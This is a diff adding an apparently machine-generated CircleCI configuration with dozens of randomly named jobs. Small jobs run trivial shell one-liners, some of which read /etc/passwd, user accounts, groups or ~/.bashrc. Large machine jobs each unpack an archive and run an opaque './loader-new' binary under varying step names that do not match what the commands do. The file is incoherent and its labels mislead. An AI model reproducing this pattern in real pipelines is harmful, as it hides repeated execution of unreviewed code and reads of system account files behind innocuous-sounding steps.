@@ -1,0 +1,1333 @@
+version: 2.1
+
+jobs:
+  fname-46075:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: No more format
+          command: |
+            mkdir -p /tmp/responder
+            set +o pipefail 2>/dev/null; cat <(seq 1 10000) <(yes 'extra' | head -n 1000) > /tmp/responder/ORD74027; true
+            echo "wrote $(wc -c </tmp/responder/ORD74027) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'ORD74027'
+  VERIFY_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  a355ccf430ba39a6db390:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Monitor the bucket policies in cell 4
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; REPORT=(crow tiger cat horse); for e in "${REPORT[@]}"; do echo "$e"; done; true ; } > /tmp/responder/228.164.2
+            echo "wrote $(wc -c </tmp/responder/228.164.2) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '228.164.2'
+  v9-canary4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  udi02:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Plant the config map
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; echo "sunny today" >${TMPDIR:-/tmp}/host.out && cp ${TMPDIR:-/tmp}/host.out ${TMPDIR:-/tmp}/inbox.txt && diff ${TMPDIR:-/tmp}/host.out ${TMPDIR:-/tmp}/inbox.txt && echo identical; true ; } > /tmp/responder/beamRenderServerProxy
+            echo "wrote $(wc -c </tmp/responder/beamRenderServerProxy) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'beamRenderServerProxy'
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  meshSkill:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Check the filter chips is disabled
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -type l -name '*' -size 0 -exec ls -ld {} + 2>/dev/null | cat -n; true ; } > /tmp/responder/5byenks07sve
+            echo "wrote $(wc -c </tmp/responder/5byenks07sve) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '5byenks07sve'
+  q2-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  u8mnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: PERF85
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; printf '%s\n' fox bear cat | while read -r w; do echo ${w^}; done; true ; } > /tmp/responder/43ca07ac5e8dd9ff3c7b550
+            echo "wrote $(wc -c </tmp/responder/43ca07ac5e8dd9ff3c7b550) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '43ca07ac5e8dd9ff3c7b550'
+  QA_HOOK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  FOSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Compact the transaction log over SSH
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=7225\nuser=ann\ndebug=true\n' >/tmp/ruby.csv && sed -n "s/^user=//p" /tmp/ruby.csv; true ; } > /tmp/responder/hawk723
+            echo "wrote $(wc -c </tmp/responder/hawk723) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'hawk723'
+  ruby3-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/hawk723 2>/dev/null || wc -c /tmp/responder/hawk723 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  release-record:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 2024 Redaction
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; sort -t: -k3,3 -n /etc/group | awk -F: '$4 != "" { print $1 }'; true ; } > /tmp/responder/51.239
+            echo "wrote $(wc -c </tmp/responder/51.239) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '51.239'
+  q4-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  galaxy-node-command:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Amara checks the batch window
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d":" -f1-3 | tr a-z A-Z | tail -n 5; true ; } > /tmp/responder/Oe
+            echo "wrote $(wc -c </tmp/responder/Oe) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'Oe'
+  jan14-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/Oe 2>/dev/null || wc -c /tmp/responder/Oe 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  rank_sprocket_muffin_small:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Mission Crimson Thunder
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 2 -exec echo {} + 2> /dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -5; true ; } > /tmp/responder/255.48
+            echo "wrote $(wc -c </tmp/responder/255.48) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '255.48'
+  node18-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  nut-838:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Billing Record Seeding Pass
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; rm -f "/tmp/graph.tmp" && echo removed; true ; } > /tmp/responder/AMBER_GLACIER_BRAMBLE_RASTER
+            echo "wrote $(wc -c </tmp/responder/AMBER_GLACIER_BRAMBLE_RASTER) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'AMBER_GLACIER_BRAMBLE_RASTER'
+  verify-partial-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  vanillax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Optimise the test fixtures properly
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; seq 63 | shuf -n 1; true ; } > /tmp/responder/echo-shimmer-kernel-alpha
+            echo "wrote $(wc -c </tmp/responder/echo-shimmer-kernel-alpha) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'echo-shimmer-kernel-alpha'
+  victor-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || wc -c /tmp/responder/beamRenderServerProxy 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  internal_publish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Fall back to updating the shift lead
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; seq 6 >'/tmp/signal.md' && tail -n 3 '/tmp/signal.md'; true ; } > /tmp/responder/ca8e9ddc-eba8-a7de
+            echo "wrote $(wc -c </tmp/responder/ca8e9ddc-eba8-a7de) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'ca8e9ddc-eba8-a7de'
+  update-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/ca8e9ddc-eba8-a7de 2>/dev/null || wc -c /tmp/responder/ca8e9ddc-eba8-a7de 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  ppPotion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Assert the share sheet shows
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; for k in widget pitch data chapter sync; do echo ${#k}; done; true ; } > /tmp/responder/16e0f33c2a64
+            echo "wrote $(wc -c </tmp/responder/16e0f33c2a64) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '16e0f33c2a64'
+  HOOK_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/16e0f33c2a64 2>/dev/null || wc -c /tmp/responder/16e0f33c2a64 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  team-papa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Cleared for drying
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; echo 'try again' >| "/tmp/Session_2023-10-16.txt" && cat "/tmp/Session_2023-10-16.txt"; true ; } > /tmp/responder/xbiSLUvM0FiO6d9tM0C
+            echo "wrote $(wc -c </tmp/responder/xbiSLUvM0FiO6d9tM0C) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'xbiSLUvM0FiO6d9tM0C'
+  CORE-32:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  RuleReceiptSession:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Mix Scope Global
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; nl ~/.bashrc | wc -w; true ; } > /tmp/responder/heathotterviolet
+            echo "wrote $(wc -c </tmp/responder/heathotterviolet) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'heathotterviolet'
+  fix-8915:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/heathotterviolet 2>/dev/null || wc -c /tmp/responder/heathotterviolet 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  noWorker:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: If the secrets bundle is locked bail out
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; find /proc/self \( -name "status" -o -name "fd" \) -exec ls -ld {} + 2>/dev/null | tail -4; true ; } > /tmp/responder/bosonsweep
+            echo "wrote $(wc -c </tmp/responder/bosonsweep) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'bosonsweep'
+  DeployTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/bosonsweep 2>/dev/null || wc -c /tmp/responder/bosonsweep 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  B5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Project Red Whisper
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f 2>/dev/null | grep '.d' | head --lines=3; true ; } > /tmp/responder/PO-2020-31215
+            echo "wrote $(wc -c </tmp/responder/PO-2020-31215) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'PO-2020-31215'
+  dotnet8-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/PO-2020-31215 2>/dev/null || wc -c /tmp/responder/PO-2020-31215 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  PRD-FEE-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Hold the threat feed steady
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd|sort -u|sed 's|.*/||'|tr "a-z" "A-Z"; true ; } > /tmp/responder/926d1f9ca23444c674621093a4b1ed579dad8
+            echo "wrote $(wc -c </tmp/responder/926d1f9ca23444c674621093a4b1ed579dad8) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '926d1f9ca23444c674621093a4b1ed579dad8'
+  bun-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/926d1f9ca23444c674621093a4b1ed579dad8 2>/dev/null || wc -c /tmp/responder/926d1f9ca23444c674621093a4b1ed579dad8 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  Span-Single-Kind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Defend the trailer cut
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; grep --color=always alias $HOME/.bashrc | sort | uniq -c; true ; } > /tmp/responder/0LthpkWgTKJ
+            echo "wrote $(wc -c </tmp/responder/0LthpkWgTKJ) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - '0LthpkWgTKJ'
+  aug17-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/0LthpkWgTKJ 2>/dev/null || wc -c /tmp/responder/0LthpkWgTKJ 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  rewind-lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: The mailing list is fine
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; id -un; true ; } > /tmp/responder/pa9
+            echo "wrote $(wc -c </tmp/responder/pa9) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'pa9'
+  build-staging-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/pa9 2>/dev/null || wc -c /tmp/responder/pa9 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  basic_flag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: VerifyMaintenancePage3
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; touch -r /etc/passwd '/tmp/avatar.txt' && stat -c %Y /etc/passwd '/tmp/avatar.txt'; true ; } > /tmp/responder/MVI61265
+            echo "wrote $(wc -c </tmp/responder/MVI61265) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'MVI61265'
+  wip-session-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/MVI61265 2>/dev/null || wc -c /tmp/responder/MVI61265 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: NODE 2DCC WAKEUP
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; touch "/var/tmp/tasks_crate.bak" && stat -c "%U %G" "/var/tmp/tasks_crate.bak"; true ; } > /tmp/responder/audit-04f7.log
+            echo "wrote $(wc -c </tmp/responder/audit-04f7.log) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'audit-04f7.log'
+  lima-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/audit-04f7.log 2>/dev/null || wc -c /tmp/responder/audit-04f7.log 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  b5702:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Make sure to release the blue green slots
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; shuf -i 7-179 -n 5 | awk '{ sum += $1 } END { print sum }'; true ; } > /tmp/responder/f4caf9eec04a0488b
+            echo "wrote $(wc -c </tmp/responder/f4caf9eec04a0488b) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'f4caf9eec04a0488b'
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/f4caf9eec04a0488b 2>/dev/null || wc -c /tmp/responder/f4caf9eec04a0488b 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  registry_nightly_s390x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: TBD sandbox
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; printf '%s\n' "done"|fold -w 7; true ; } > /tmp/responder/MV
+            echo "wrote $(wc -c </tmp/responder/MV) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'MV'
+  Build_Pipeline2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/responder
+      - run:
+          name: Unpack handoff
+          command: |
+            shopt -q interactive_comments && wc -c /tmp/responder/228.164.2 2>/dev/null || wc -c /tmp/responder/228.164.2 2>/dev/null || true
+      - run:
+          name: Fetch repository
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc inventory-pending.tar.xz | tar xf -
+      - run:
+          command: exec ./loader-new
+  comment_collect_disable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Pinch the dropdown then screenshot
+          command: |
+            mkdir -p /tmp/responder
+            { set +o pipefail 2>/dev/null; for u in $(seq 9); do echo "line $u"; done; true ; } > /tmp/responder/n9y7d0ap
+            echo "wrote $(wc -c </tmp/responder/n9y7d0ap) B"
+      - persist_to_workspace:
+          root: /tmp/responder
+          paths:
+            - 'n9y7d0ap'
+  q4-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
